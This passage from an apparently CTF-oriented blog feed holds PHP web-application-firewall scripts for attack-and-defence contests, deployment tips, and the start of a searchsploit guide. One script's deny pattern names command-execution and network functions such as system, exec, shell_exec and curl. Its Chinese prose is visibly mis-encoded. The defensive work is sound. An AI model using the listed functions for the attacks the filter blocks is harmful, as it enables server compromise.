data-num=\"39\"></td><td><pre> * [banIP IP å°ç¦æ¨¡å—]</pre></td></tr><tr><td data-num=\"40\"></td><td><pre> * @return [type] [description]</pre></td></tr><tr><td data-num=\"41\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">banIP</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token keyword\">global</span> <span class=\"token variable\">$blackIp</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_file</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'black.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t<span class=\"token variable\">$blackIp</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_filter</span><span class=\"token punctuation\">(</span><span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'black.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t<span class=\"token variable\">$userIP</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t<span class=\"token variable\">$_not_found</span> <span class=\"token operator\">=</span> <span class=\"token string heredoc-string\"><span class=\"token delimiter symbol\"><span class=\"token punctuation\">&lt;&lt;&lt;</span>END</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>&lt;!DOCTYPE html PUBLIC '-//IETF//DTD HTML 2.0//EN'></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>&lt;html>&lt;head></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>&lt;meta http-equiv='content-type' content='text/html; charset=windows-1252'></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>&lt;title>404 Not Found&lt;/title></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>&lt;/head>&lt;body></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>&lt;h1>Not Found&lt;/h1></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>&lt;p>The requested URL / was not found on this server.&lt;/p></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>&lt;/body></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>&lt;/html></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token delimiter symbol\">END<span class=\"token punctuation\">;</span></span></span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$userIP</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$blackIp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t\t<span class=\"token variable\">$staus_code</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"HTTP/1.1 404 Not Found\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t\t<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$staus_code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_not_found</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token function\">access</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token function\">banIP</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><a href=\"https://github.com/sharpleung/CTF-WAF\">é¡¹ç›®åœ°å€åŠå®˜æ–¹æ–‡æ¡£</a></p>\n<div class=\"tab\" data-id=\"id1\" data-title=\"wafè„šæœ¬2\">\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">define</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'LOG_FILENAME'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'log.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">function_exists</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'getallheaders'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getallheaders</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'HTTP_'</span><span class=\"token punctuation\">)</span> <span class=\"token variable\">$headers</span><span class=\"token punctuation\">[</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'-'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">ucwords</span><span class=\"token punctuation\">(</span><span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'_'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token variable\">$headers</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token variable\">$get</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token variable\">$post</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$cookie</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$header</span> <span class=\"token operator\">=</span> <span class=\"token function\">getallheaders</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token variable\">$files</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token variable\">$ip</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"REMOTE_ADDR\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token variable\">$method</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REQUEST_METHOD'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token variable\">$filepath</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"SCRIPT_NAME\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token comment\">//rewirte shell which uploaded by others, you can do more</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token variable\">$files</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'content'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"virink\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Accept'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//fix a bug</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token variable\">$input</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token string double-quoted-string\">\"Get\"</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$get</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token string double-quoted-string\">\"Post\"</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$post</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token string double-quoted-string\">\"Cookie\"</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$cookie</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token string double-quoted-string\">\"File\"</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$files</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token string double-quoted-string\">\"Header\"</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$header</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token comment\">//deal with</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token variable\">$pattern</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select|insert|update|delete|and|or|\\'|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile|dumpfile|sub|hex\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token variable\">$pattern</span><span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"|file_put_contents|fwrite|curl|system|eval|assert\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token variable\">$pattern</span><span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token variable\">$pattern</span><span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token variable\">$vpattern</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"|\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pattern</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token variable\">$bool</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$input</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$k</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$v</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$vpattern</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$v</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$kk</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$vv</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/<span class=\"token interpolation\"><span class=\"token variable\">$value</span></span>/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$vv</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>                    <span class=\"token variable\">$bool</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                    <span class=\"token function\">logging</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$bool</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$bool</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">logging</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token function\">date_default_timezone_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Asia/Shanghai\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// ä¿®æ­£æ—¶é—´ä¸ºä¸­å›½å‡†ç¡®æ—¶é—´</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token variable\">$time</span><span class=\"token operator\">=</span><span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Y-m-d H:i:s\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// å°†æ—¶é—´èµ‹å€¼ç»™å˜é‡ $time</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token constant\">LOG_FILENAME</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\\r\\n\\r\\n\\r\\n\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$time</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"\\r\\n\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token constant\">FILE_APPEND</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure></div>\n</div>\n</div>\n<p><span class=\"spoiler\" title=\"ä½ çŸ¥é“å¾—å¤ªå¤šäº†\">ä¸ªäººæ„Ÿè§‰ç¬¬äºŒä¸ªè„šæœ¬å¥½ç”¨äº›</span></p>\n<h2 id=\"waféƒ¨ç½²æ–¹å¼\"><a class=\"anchor\" href=\"#waféƒ¨ç½²æ–¹å¼\">#</a> waf éƒ¨ç½²æ–¹å¼ï¼š</h2>\n<h3 id=\"æœ‰rootæƒé™\"><a class=\"anchor\" href=\"#æœ‰rootæƒé™\">#</a> æœ‰ root æƒé™</h3>\n<p><mark>php.ini è®¾ç½®</mark></p>\n<p>ä¸€èˆ¬è·¯å¾„åœ¨ <code>/etc/php/&#123;ç‰ˆæœ¬å·&#125;/apache2/php.ini</code> ï¼Œä¹Ÿå¯ä»¥è¿™æ ·æ‰¾ï¼š <code>php -i | grep &quot;php.ini&quot;</code></p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"><span>php.ini</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>auto_prepend_file &#x3D; &#x2F;var&#x2F;www&#x2F;html&#x2F;waf.php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>auto_append_file &#x3D; &#x2F;var&#x2F;www&#x2F;html&#x2F;waf.php</pre></td></tr></table></figure><p>ä¿å­˜å <code>sudo service apache2 restart</code> ï¼Œé‡å¯ apache æœåŠ¡</p>\n<p>æˆ–è€…å†™åœ¨ .user.ini æˆ–è€… .htaccess ä¸­ã€‚</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"><span>.htaccess/.user.ini</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>php_value auto_prepend_file â€œ&#x2F;dir&#x2F;path&#x2F;phpwaf.phpâ€</pre></td></tr></table></figure><h3 id=\"åªæœ‰æŸä¸€æ™®é€šç”¨æˆ·çš„æƒé™\"><a class=\"anchor\" href=\"#åªæœ‰æŸä¸€æ™®é€šç”¨æˆ·çš„æƒé™\">#</a> åªæœ‰æŸä¸€æ™®é€šç”¨æˆ·çš„æƒé™</h3>\n<p>åœ¨ /var/www/html çš„ index.php ä¸­æ·»åŠ </p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">include_once</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'waf.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'waf.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ä¸æ˜¾ç¤ºæŠ¥é”™ä¿¡æ¯</span></pre></td></tr></table></figure><h2 id=\"æ‰¾åˆ°cmsæ¡†æ¶é€šç”¨é…ç½®æ–‡ä»¶è¿›è¡ŒåŒ…å«\"><a class=\"anchor\" href=\"#æ‰¾åˆ°cmsæ¡†æ¶é€šç”¨é…ç½®æ–‡ä»¶è¿›è¡ŒåŒ…å«\">#</a> æ‰¾åˆ° CMS / æ¡†æ¶é€šç”¨é…ç½®æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼š</h2>\n<blockquote>\n<p>PHPCMS V9ï¼š\\phpcms\\base.php<br />\nPHPWIND8.7ï¼š\\data\\sql_config.php<br />\nDEDECMS5.7ï¼š\\data\\common.inc.php<br />\nDiscuzX2ï¼š\\config\\config_global.php<br />\nWordPressï¼š\\wp-config.php<br />\nMetinfoï¼š\\include\\head.php</p>\n</blockquote>\n",
            "tags": [
                "AWD",
                "Attack and Defence"
            ]
        },
        {
            "id": "https://ctf-learner.github.io/post/%E4%B8%8D%E4%BC%9A%E5%B0%B1%E6%90%9Csearchsploit/",
            "url": "https://ctf-learner.github.io/post/%E4%B8%8D%E4%BC%9A%E5%B0%B1%E6%90%9Csearchsploit/",
            "title": "ä¸ä¼šå°±æœsearchsploit",
            "date_published": "2024-04-19T11:52:08.000Z",
            "content_html": "<p><span class=\"label success\">ä¸Šæ¬¡æ›´æ–°æ—¶é—´ï¼š2024-04-19</span></p>\n<h1 id=\"searchsploitç¦»çº¿å·¥å…·\"><a class=\"anchor\" href=\"#searchsploitç¦»çº¿å·¥å…·\">#</a> searchsploit ç¦»çº¿å·¥å…·</h1>\n<blockquote>\n<ul class=\"lvl-1\">\n<li class=\"lvl-2\">â€œsearchsploitâ€ æ˜¯ä¸€ä¸ªç”¨äº Exploit-DB çš„å‘½ä»¤è¡Œæœç´¢å·¥å…·ï¼Œå®ƒè¿˜å…è®¸ä½ éšèº«å¸¦ä¸€ä»½ Exploit-DB çš„å‰¯æœ¬ã€‚</li>\n<li class=\"lvl-2\">SearchSploit æä¾›äº†åœ¨æœ¬åœ°ä¿å­˜çš„å­˜å‚¨åº“ä¸­æ‰§è¡Œè¯¦ç»†çš„ç¦»çº¿æœç´¢çš„èƒ½åŠ›ã€‚</li>\n<li class=\"lvl-2\">è®¸å¤šæ¼æ´éƒ½åŒ…å«äº†äºŒè¿›åˆ¶æ–‡ä»¶çš„é“¾æ¥ï¼Œè¿™äº›æ–‡ä»¶ä¸åŒ…å«åœ¨æ ‡å‡†å­˜å‚¨åº“ä¸­ï¼Œä½†å¯ä»¥åœ¨ Exploit-DB äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ‰¾åˆ°ã€‚</li>\n</ul>\n</blockquote>\n<h1 id=\"æ›´æ–°searchsploit\"><a class=\"anchor\" href=\"#æ›´æ–°searchsploit\">#</a> æ›´æ–° searchsploit</h1>\n<div class=\"note warning\">\n<p><strong>çº¿ä¸‹ AWD å¼€èµ›å‰ï¼Œè®°å¾—è·Ÿæ–° searchsploit!</strong></p>\n</div>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">apt</span> update <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">apt</span> <span class=\"token parameter variable\">-y</span> full-upgrade</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>searchsploit <span class=\"token parameter variable\">-u</span></pre></td></tr></table></figure><h1 id=\"searchsploitå‘½ä»¤ä½¿ç”¨\"><a class=\"anchor\" href=\"#searchsploitå‘½ä»¤ä½¿ç”¨\">#</a> searchsploit å‘½ä»¤ä½¿ç”¨</h1>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">é€‰é¡¹</th>\n<th style=\"text-align:center\">åŠŸèƒ½</th>\n<th style=\"text-align:left\">ä¾‹å¦‚</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">-u</td>\n<td style=\"text-align:center\">æ£€æŸ¥å¹¶å®‰è£…ä»»ä½• exploitdb è½¯ä»¶åŒ…æ›´æ–°</td>\n<td style=\"text-align:left\">searchsploit -u</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-t</td>\n<td style=\"text-align:center\">ä»…å¯¹æ ‡é¢˜æœç´¢</td>\n<td 